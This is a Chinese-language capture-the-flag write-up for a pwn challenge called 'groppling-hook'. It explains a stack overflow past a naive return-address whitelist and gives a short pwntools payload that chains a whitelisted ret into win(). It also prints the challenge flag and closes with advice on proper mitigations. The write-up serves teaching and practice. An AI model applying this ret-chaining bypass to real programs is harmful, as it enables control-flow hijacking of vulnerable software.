# groppling-hook

## 题目简述

`pwnable()` 只有 10 字节栈缓冲区，却读取 56 字节，能够覆盖返回地址。函数尾部又加入一段“反 ROP”汇编：它从栈上取出即将返回的地址，只允许该地址落在 `0x401262` 到 `0x40128a` 的程序内部区间，否则调用 `laugh()` 退出。

## 解题过程

检查器只验证栈顶的第一个返回地址，没有验证后续栈内容。覆盖偏移为 18 字节，先放入允许区间末端的 `0x40128a`，再放 `win`：

```python
from pwn import ELF, p64

exe = ELF("bin/out", checksec=False)
payload = b"A" * 18
payload += p64(0x40128a)
payload += p64(exe.sym["win"])
```

内联汇编弹出并检查 `0x40128a` 后又把它压回去，`pwnable()` 首先合法返回到 `main` 的尾部。该位置随后执行函数结尾的 `ret`，从下一项栈内容取出 `win`，从而绕过只看一层的检测。

`win()` 读取并打印：

```text
tjctf{this_i#-my-questsss}
```

## 方法总结

- 只检查单个返回地址无法阻止多阶段控制流；攻击者可以先返回到白名单内的 `ret` 或函数尾，再跳向真正目标。
- 分析手写栈检查时要逐条跟踪 `rsp`、`pop`、`push` 和每个 `ret` 消耗的槽位。
- 根本修复仍是消除越界读写并启用常规编译保护，而不是在受攻击的栈上实现临时返回地址过滤。
